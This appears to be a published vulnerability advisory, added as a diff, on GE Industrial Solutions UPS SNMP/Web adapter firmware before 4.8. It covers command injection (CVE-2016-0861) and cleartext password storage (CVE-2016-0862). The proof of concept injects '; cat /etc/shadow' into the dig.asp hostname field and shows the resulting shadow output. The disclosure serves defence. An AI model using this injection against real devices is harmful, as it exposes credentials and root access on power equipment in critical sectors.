@@ -1,0 +1,72 @@
+# Exploit Title: [GE Industrial Solutions - UPS SNMP Adapter Command
+Injection and Clear-text Storage of Sensitive Information Vulnerabilities]
+# Discovered by: Karn Ganeshen
+# Vendor Homepage: [http://www.geindustrial.com/]
+# Versions Reported: [All SNMP/Web Interface cards with firmware version
+prior to 4.8 manufactured by GE Industrial Solutions.]
+# CVE-IDs: [CVE-2016-0861 + CVE-2016-0862]
+
+*GE Advisory: *
+http://apps.geindustrial.com/publibrary/checkout/GEIS_SNMP?TNR=Application%20and%20Technical|GEIS_SNMP|PDF&filename=GEIS_SNMP.pdf
+
+
+*ICS-CERT Advisory:*https://ics-cert.us-cert.gov/advisories/ICSA-16-033-02
+
+*About GE*
+
+GE is a US-based company that maintains offices in several countries around
+the world.
+
+The affected product, SNMP/Web Interface adapter, is a web server designed
+to present information about the Uninterruptible Power Supply (UPS).
+According to GE, the SNMP/Web Interface is deployed across several sectors
+including Critical Manufacturing and Energy. GE estimates that these
+products are used worldwide.
+
+*Affected Products*
+
+• All SNMP/Web Interface cards with firmware version prior to 4.8
+manufactured by GE Industrial Solutions.
+
+
+
+*VULNERABILITY OVERVIEW*
+A
+
+
+*COMMAND INJECTIONCVE-2016-0861*
+Device application services run as (root) privileged user, and does not
+perform strict input validation. This allows an authenticated user to
+execute any system commands on the system.
+
+Vulnerable function:
+http://IP/dig.asp <http://ip/dig.asp>
+
+Vulnerable parameter:
+Hostname/IP address
+
+
+*PoC:*
+In the Hostname/IP address input, enter:
+; cat /etc/shadow
+
+Output
+root:<hash>:0:0:root:/root:/bin/sh
+<...other system users...>
+ge:<hash>:101:0:gedeups7:/home/admin:/bin/sh
+root123:<hash>:102:0:gedeups2:/home/admin:/bin/sh
+
+B
+
+
+*CLEARTEXT STORAGE OF SENSITIVE INFORMATIONCVE-2016-0862*
+File contains sensitive account information stored in cleartext. All users,
+including non-admins, can view/access device's configuration, via Menu
+option -> Save -> Settings.
+
+The application stores all information in clear-text, including *all user
+logins and clear-text passwords*.
+-- 
+Best Regards,
+Karn Ganeshen
+ipositivesecurity.blogspot.in
